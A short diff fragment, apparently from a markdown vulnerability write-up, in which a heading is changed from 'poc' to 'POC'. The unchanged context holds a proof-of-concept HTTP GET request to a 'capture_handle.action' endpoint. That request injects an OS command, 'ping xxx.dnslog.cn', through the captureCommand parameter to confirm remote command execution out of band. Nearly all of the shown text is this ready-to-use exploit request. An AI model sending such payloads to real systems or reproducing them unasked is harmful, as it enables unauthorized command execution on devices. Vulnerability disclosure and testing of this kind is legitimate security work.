@@ -11,7 +11,7 @@
 ```
 
 
-## poc
+## POC
 ```
 GET /config/asst/system_setPassWordValidate.action/capture_handle.action?captureFlag=true&captureCommand=ping%20xxx.dnslog.cn%20index.pcap HTTP/1.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
